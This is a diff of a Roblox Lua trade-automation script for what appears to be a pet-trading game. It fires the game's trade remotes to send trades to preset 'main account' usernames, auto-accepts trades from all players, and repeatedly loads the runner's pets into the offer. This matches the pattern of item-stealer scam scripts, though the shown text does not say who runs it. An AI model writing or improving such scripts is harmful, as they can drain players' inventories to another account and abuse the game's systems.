@@ -1,14 +1,16 @@
- local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
 
 -- =================================================
 
-local addItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer")
+-- Remotes and Functions
 local sendTradeRemote = ReplicatedStorage:FindFirstChild("TradeAPI/SendTradeRequest", true)
 local tradeFunction = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
+local addItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer")
 
+-- Load ClientData for inventory scanning[cite: 3]
 local successClientData, ClientData = pcall(function()
 	return require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
 end)
@@ -28,6 +30,25 @@ local function sendTradeRequest(playerName)
 	end
 end
 
+local function acceptTradeForAll()
+	for _, targetPlayer in ipairs(Players:GetPlayers()) do
+		if targetPlayer ~= Players.LocalPlayer then
+			local args = {
+				targetPlayer,
+				true
+			}
+
+			local success, err = pcall(function()
+				return tradeFunction:InvokeServer(unpack(args))
+			end)
+
+			if success then
+				print("Successfully processed trade request for: " .. targetPlayer.Name)
+			end
+		end
+	end
+end
+
 local function getMultipleUniqueIdsByName(itemName, limit)
 	if not successClientData or not ClientData then
 		return {}
@@ -35,7 +56,7 @@ local function getMultipleUniqueIdsByName(itemName, limit)
 
 	local dataStore = ClientData.get_data()
 	local playerData = dataStore and (dataStore[LocalPlayer] or dataStore[LocalPlayer.Name])
-
+	
 	if not playerData or not playerData.inventory or not playerData.inventory.pets then
 		return {}
 	end
@@ -52,9 +73,9 @@ local function getMultipleUniqueIdsByName(itemName, limit)
 	return uniqueIds
 end
 
+-- Thread 1: Handles sending and accepting trades
 task.spawn(function()
 	while true do
-		-- Only loop if names are provided and not empty
 		if MainAccUsername and #MainAccUsername > 0 and MainAccUsername[1] ~= "" then
 			for _, playerName in ipairs(MainAccUsername) do
 				if Players:FindFirstChild(playerName) then
@@ -67,20 +88,21 @@ task.spawn(function()
 			acceptTradeForAll()
 		end
 
-		task.wait(0.3)
+		task.wait(2)
 	end
 end)
 
--- Single execution without the loop
-while true do
-	local uniqueIds = getMultipleUniqueIdsByName(TARGET_ITEM_NAME, 18)
-
-	for _, uniqueId in ipairs(uniqueIds) do
-		pcall(function()
-			addItemRemote:FireServer(uniqueId)
-		end)
+-- Thread 2: Dedicated fast loop to continuously add items up to the 18 slot limit
+task.spawn(function()
+	while true do
+		local uniqueIds = getMultipleUniqueIdsByName(TARGET_ITEM_NAME, 18)
+		for _, uniqueId in ipairs(uniqueIds) do
+			pcall(function()
+				addItemRemote:FireServer(uniqueId)
+			end)
+		end
+		
+		-- Fast interval to keep trying to fill the slots immediately when a trade opens
+		task.wait(0.2)
 	end
-
-	-- Adjust the delay (in seconds) between each loop cycle as needed
-	task.wait(1.3) 
-end
+end)
